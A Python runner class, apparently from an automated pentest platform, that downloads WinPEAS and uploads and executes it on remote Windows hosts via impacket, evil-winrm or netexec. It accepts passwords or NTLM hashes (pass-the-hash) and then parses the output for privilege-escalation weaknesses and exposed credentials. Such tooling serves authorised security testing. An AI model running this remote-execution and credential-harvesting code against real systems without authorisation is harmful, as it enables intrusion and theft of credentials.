"""
WinPEAS - Windows Privilege Escalation Awesome Script runner
Comprehensive Windows enumeration script for privilege escalation
"""

import subprocess
import logging
import os
from typing import Dict, List, Any
from pathlib import Path
from app.services.tool_runners.base_runner import BaseToolRunner

logger = logging.getLogger(__name__)


class WinPEASRunner(BaseToolRunner):
    """WinPEAS privilege escalation enumeration runner"""

    def __init__(self, scan_id: str):
        super().__init__(scan_id, "winpeas")
        self.output_dir = Path(f"/tmp/winpeas_{scan_id}")
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.winpeas_path = "/opt/winpeas"
        self.winpeas_urls = {
            "x64": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
            "x86": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx86.exe",
            "any": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe",
            "bat": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat"
        }

    def validate_input(self, targets: List[str], config: Dict[str, Any] = None) -> bool:
        """Validate WinPEAS input"""
        config = config or {}
        # Need target and credentials for remote execution
        if config.get('mode') == 'remote':
            if not targets:
                return False
            if not config.get('username') or not (config.get('password') or config.get('hash')):
                return False
        return True

    def run(self, targets: List[str], config: Dict[str, Any] = None) -> Dict[str, Any]:
        """
        Run WinPEAS

        Config options:
            - mode: remote (default for automated pentest)
            - arch: x64, x86, any, bat (default: x64)
            - username: Windows username
            - password: Password
            - hash: NTLM hash for pass-the-hash
            - domain: Domain name
            - checks: Specific checks to run
                - systeminfo: System information
                - userinfo: User/group information
                - processinfo: Process information
                - servicesinfo: Services information
                - applicationsinfo: Applications information
                - networkinfo: Network information
                - windowscreds: Windows credentials
                - browserinfo: Browser information
                - filesinfo: Interesting files
                - eventsinfo: Event logs
            - quiet: Reduced output
            - wait: Wait time between checks (ms)
            - log: Enable logging
        """
        config = config or {}
        mode = config.get('mode', 'remote')

        if mode == 'remote':
            if not targets:
                return {"error": "Target required for remote execution", "success": False}
            return self._run_remote(targets[0], config)
        else:
            return self._generate_payload(config)

    def _run_remote(self, target: str, config: Dict[str, Any]) -> Dict[str, Any]:
        """Run WinPEAS on remote Windows host"""
        username = config.get('username')
        password = config.get('password')
        hash_value = config.get('hash')
        domain = config.get('domain', '.')
        arch = config.get('arch', 'x64')
        checks = config.get('checks', 'all')

        output_file = self.output_dir / f"winpeas_{target.replace('.', '_')}_{self.scan_id}.txt"

        # Download WinPEAS if needed
        winpeas_exe = Path(self.winpeas_path) / f"winPEAS{arch}.exe"
        if not winpeas_exe.exists():
            self._download_winpeas(arch)

        # Method 1: Try using impacket's smbexec/wmiexec
        result = self._execute_via_impacket(target, username, password, hash_value, domain, winpeas_exe, output_file, checks)
        if result.get('success'):
            return result

        # Method 2: Try using evil-winrm
        result = self._execute_via_winrm(target, username, password, hash_value, domain, winpeas_exe, output_file, checks)
        if result.get('success'):
            return result

        # Method 3: Try using crackmapexec/netexec
        result = self._execute_via_cme(target, username, password, hash_value, domain, winpeas_exe, output_file)
        if result.get('success'):
            return result

        return {
            "success": False,
            "error": "Failed to execute WinPEAS via any method",
            "target": target,
            "methods_tried": ["impacket", "evil-winrm", "crackmapexec"]
        }

    def _execute_via_impacket(self, target: str, username: str, password: str,
                               hash_value: str, domain: str, winpeas_exe: Path,
                               output_file: Path, checks: str) -> Dict[str, Any]:
        """Execute WinPEAS via Impacket's smbexec/wmiexec"""
        try:
            # Build credentials string
            if hash_value:
                creds = f"{domain}/{username}@{target} -hashes :{hash_value}"
            else:
                creds = f"{domain}/{username}:{password}@{target}"

            # First, upload WinPEAS
            upload_cmd = ['smbclient.py', creds, '-c', f'put {winpeas_exe} C:\\Windows\\Temp\\winpeas.exe']

            logger.info(f"Uploading WinPEAS to {target}")
            process = subprocess.run(upload_cmd, capture_output=True, text=True, timeout=60)

            # Execute WinPEAS
            exec_cmd = ['wmiexec.py', creds, 'C:\\Windows\\Temp\\winpeas.exe', checks if checks != 'all' else '']

            logger.info(f"Executing WinPEAS on {target}")
            process = subprocess.Popen(
                exec_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            stdout, stderr = process.communicate(timeout=1800)

            # Save output
            with open(output_file, 'w') as f:
                f.write(stdout)

            # Parse findings
            findings = self._parse_output(output_file)

            # Cleanup
            cleanup_cmd = ['wmiexec.py', creds, 'del C:\\Windows\\Temp\\winpeas.exe']
            subprocess.run(cleanup_cmd, capture_output=True, timeout=30)

            return {
                "success": True,
                "method": "impacket",
                "target": target,
                "findings": findings,
                "output_file": str(output_file),
                "summary": self._create_summary(findings)
            }

        except FileNotFoundError:
            return {"success": False, "error": "Impacket tools not found"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Execution timed out"}
        except Exception as e:
            logger.error(f"Impacket execution error: {e}")
            return {"success": False, "error": str(e)}

    def _execute_via_winrm(self, target: str, username: str, password: str,
                           hash_value: str, domain: str, winpeas_exe: Path,
                           output_file: Path, checks: str) -> Dict[str, Any]:
        """Execute WinPEAS via Evil-WinRM"""
        try:
            cmd = ['evil-winrm', '-i', target, '-u', username]

            if hash_value:
                cmd.extend(['-H', hash_value])
            else:
                cmd.extend(['-p', password])

            logger.info(f"Executing WinPEAS via WinRM on {target}")

            process = subprocess.Popen(
                cmd,
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )

            # Send commands
            commands = f"""
upload {winpeas_exe} C:\\Windows\\Temp\\winpeas.exe
C:\\Windows\\Temp\\winpeas.exe {checks if checks != 'all' else ''}
del C:\\Windows\\Temp\\winpeas.exe
exit
"""
            stdout, stderr = process.communicate(input=commands, timeout=1800)

            with open(output_file, 'w') as f:
                f.write(stdout)

            findings = self._parse_output(output_file)

            return {
                "success": True,
                "method": "evil-winrm",
                "target": target,
                "findings": findings,
                "output_file": str(output_file),
                "summary": self._create_summary(findings)
            }

        except FileNotFoundError:
            return {"success": False, "error": "Evil-WinRM not found"}
        except subprocess.TimeoutExpired:
            return {"success": False, "error": "Execution timed out"}
        except Exception as e:
            logger.error(f"WinRM execution error: {e}")
            return {"success": False, "error": str(e)}

    def _execute_via_cme(self, target: str, username: str, password: str,
                         hash_value: str, domain: str, winpeas_exe: Path,
                         output_file: Path) -> Dict[str, Any]:
        """Execute WinPEAS via CrackMapExec/NetExec"""
        try:
            # Try netexec first, fall back to crackmapexec
            for tool in ['nxc', 'crackmapexec']:
                cmd = [tool, 'smb', target, '-u', username]

                if hash_value:
                    cmd.extend(['-H', hash_value])
                else:
                    cmd.extend(['-p', password])

                if domain and domain != '.':
                    cmd.extend(['-d', domain])

                # Use put and exec
                cmd.extend(['--put-file', str(winpeas_exe), 'C:\\Windows\\Temp\\winpeas.exe'])

                try:
                    process = subprocess.run(cmd, capture_output=True, text=True, timeout=60)

                    # Execute
                    exec_cmd = cmd[:cmd.index('--put-file')] + ['-x', 'C:\\Windows\\Temp\\winpeas.exe']
                    process = subprocess.Popen(
                        exec_cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=1800)

                    with open(output_file, 'w') as f:
                        f.write(stdout)

                    findings = self._parse_output(output_file)

                    return {
                        "success": True,
                        "method": tool,
                        "target": target,
                        "findings": findings,
                        "output_file": str(output_file),
                        "summary": self._create_summary(findings)
                    }

                except FileNotFoundError:
                    continue

            return {"success": False, "error": "Neither nxc nor crackmapexec found"}

        except Exception as e:
            logger.error(f"CME execution error: {e}")
            return {"success": False, "error": str(e)}

    def _generate_payload(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate WinPEAS payload for manual execution"""
        arch = config.get('arch', 'x64')

        # Download if needed
        winpeas_exe = Path(self.winpeas_path) / f"winPEAS{arch}.exe"
        if not winpeas_exe.exists():
            self._download_winpeas(arch)

        return {
            "success": True,
            "mode": "payload",
            "executable": str(winpeas_exe),
            "usage": [
                f"Transfer {winpeas_exe} to target",
                "Run: winPEAS.exe all",
                "Or specific: winPEAS.exe systeminfo userinfo servicesinfo"
            ],
            "download_urls": self.winpeas_urls
        }

    def _download_winpeas(self, arch: str = 'x64') -> bool:
        """Download WinPEAS executable"""
        try:
            os.makedirs(self.winpeas_path, exist_ok=True)
            url = self.winpeas_urls.get(arch, self.winpeas_urls['x64'])
            output = Path(self.winpeas_path) / f"winPEAS{arch}.exe"

            subprocess.run(['curl', '-sL', '-o', str(output), url], check=True)
            return True
        except Exception as e:
            logger.error(f"Failed to download WinPEAS: {e}")
            return False

    def _parse_output(self, output_file: Path) -> Dict[str, List]:
        """Parse WinPEAS output for findings"""
        findings = {
            "critical": [],
            "high": [],
            "medium": [],
            "low": [],
            "unquoted_service_paths": [],
            "weak_permissions": [],
            "credentials": [],
            "autologon": [],
            "cached_credentials": [],
            "tokens": [],
            "interesting_files": [],
            "scheduled_tasks": [],
            "always_install_elevated": False,
            "uac_status": None
        }

        if not output_file.exists():
            return findings

        try:
            with open(output_file, 'r', errors='ignore') as f:
                content = f.read()

            for line in content.split('\n'):
                line_stripped = line.strip()

                # Critical findings
                if any(x in line.lower() for x in ['always install elevated', 'alwaysinstallelevated']):
                    findings["always_install_elevated"] = True
                    findings["critical"].append(line_stripped)

                # Unquoted service paths
                if 'unquoted' in line.lower() or ('service' in line.lower() and 'path' in line.lower() and ' ' in line):
                    findings["unquoted_service_paths"].append(line_stripped)

                # Weak permissions
                if any(x in line.lower() for x in ['everyone', 'full control', 'authenticated users', 'builtin\\users']):
                    if 'write' in line.lower() or 'full' in line.lower() or 'modify' in line.lower():
                        findings["weak_permissions"].append(line_stripped)

                # Credentials
                if any(x in line.lower() for x in ['password', 'pwd', 'credential', 'autologon']):
                    if '=' in line or ':' in line:
                        findings["credentials"].append(line_stripped)

                # Autologon
                if 'autologon' in line.lower():
                    findings["autologon"].append(line_stripped)

                # UAC status
                if 'uac' in line.lower():
                    findings["uac_status"] = line_stripped

                # Tokens
                if 'impersonate' in line.lower() or 'seimpersonate' in line.lower() or 'sedebug' in line.lower():
                    findings["tokens"].append(line_stripped)

                # Scheduled tasks
                if 'scheduled' in line.lower() and 'task' in line.lower():
                    findings["scheduled_tasks"].append(line_stripped)

        except Exception as e:
            logger.error(f"Failed to parse WinPEAS output: {e}")

        # Deduplicate
        for key in findings:
            if isinstance(findings[key], list):
                findings[key] = list(set(findings[key]))[:50]

        return findings

    def _create_summary(self, findings: Dict) -> Dict[str, Any]:
        """Create summary of findings"""
        return {
            "critical_findings": len(findings.get('critical', [])),
            "always_install_elevated": findings.get('always_install_elevated', False),
            "unquoted_service_paths": len(findings.get('unquoted_service_paths', [])),
            "weak_permissions": len(findings.get('weak_permissions', [])),
            "credentials_found": len(findings.get('credentials', [])),
            "tokens": len(findings.get('tokens', [])),
            "uac_status": findings.get('uac_status')
        }

    def parse_output(self, output: str) -> Dict[str, Any]:
        """Parse WinPEAS text output"""
        return {"raw_output": output}
